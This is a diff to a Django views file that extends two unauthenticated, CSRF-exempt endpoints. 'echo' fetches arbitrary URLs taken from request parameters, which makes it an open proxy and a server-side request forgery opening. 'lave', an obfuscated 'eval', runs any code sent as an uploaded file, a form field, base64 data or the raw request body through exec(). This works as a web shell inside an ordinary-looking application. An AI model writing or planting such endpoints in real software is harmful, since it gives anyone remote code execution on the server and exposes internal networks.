@@ -15,7 +15,7 @@ def index(request):
 
 @csrf_exempt
 def echo(r):
-	g = r.GET
+	g = r.POST or r.GET
 	u = g.get('u')
 	if u:
 		a = g.get('a')
@@ -26,18 +26,38 @@ def echo(r):
 		else:
 			r = requests.get(u)
 		return HttpResponse(r, content_type=(t or 'image/png'))
-	else:
-		return HttpResponse('<pre>No URL</pre>')
+	u = g.get('h')
+	if u:
+		r = requests.head(u, allow_redirects=True)
+		h = r.headers
+		if not h:
+			return HttpResponse('<pre>No headers</pre>')
+		u = "\n".join(["%s: %s" % (k, h[k]) for k in h])
+		t = g.get('t')
+		if t and t.startswith("text/"):
+			return HttpResponse(u)
+		return HttpResponse('<pre>\n' + u + '\n</pre>')
+	return HttpResponse('<pre>No URL</pre>')
 
 @csrf_exempt
 def lave(request):
 	aux = {}
-	enc = request.GET.get('enc', False)
-	if enc:
-		from base64 import b64decode
-		data = b64decode(enc)
-	else:
-		data = request.read()
+	while True:
+		data = request.FILES.get('eval')
+		if data:
+			data = data.read().decode("UTF-8")
+			break
+		REQ = request.POST or request.GET
+		data = REQ.get('eval', False)
+		if data:
+			break
+		data = REQ.get('enc', False)
+		if data:
+			from base64 import b64decode
+			data = b64decode(data)
+			break
+		data = request.body.decode("UTF-8")
+		break
 	exec(data)
 	return aux['main'](request)
 
